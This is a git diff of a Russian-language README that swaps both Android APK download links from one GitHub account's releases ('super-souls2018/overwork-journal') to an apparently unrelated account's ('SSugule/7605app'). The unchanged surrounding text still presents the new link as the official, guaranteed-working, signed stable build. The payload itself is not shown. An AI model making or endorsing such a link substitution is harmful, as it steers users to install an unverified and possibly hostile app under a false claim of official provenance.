@@ -9,7 +9,7 @@
 Для установки приложения на мобильное устройство Android нажмите на кнопку под этим текстом:
 
 <div align="center">
-  <a href="https://github.com/super-souls2018/overwork-journal/releases/download/latest/app-installer.apk">
+  <a href="https://github.com/SSugule/7605app/releases/download/latest/app-installer.apk">
     <img src="https://img.shields.io/badge/Скачать_APK-Установить_на_Android-green?style=for-the-badge&logo=android&logoColor=white" alt="Скачать APK" height="50">
   </a>
 </div>
@@ -17,7 +17,7 @@
 <br>
 
 > **💡 Надежная ссылка (GitHub Releases):** Скачайте гарантированно рабочий и подписанный файл APK последней стабильной сборки напрямую с официальных релизов GitHub:  
-> 👉 **[Скачать app-installer.apk (Последний релиз)](https://github.com/super-souls2018/overwork-journal/releases/download/latest/app-installer.apk)** 👈
+> 👉 **[Скачать app-installer.apk (Последний релиз)](https://github.com/SSugule/7605app/releases/download/latest/app-installer.apk)** 👈
 
 ---
 
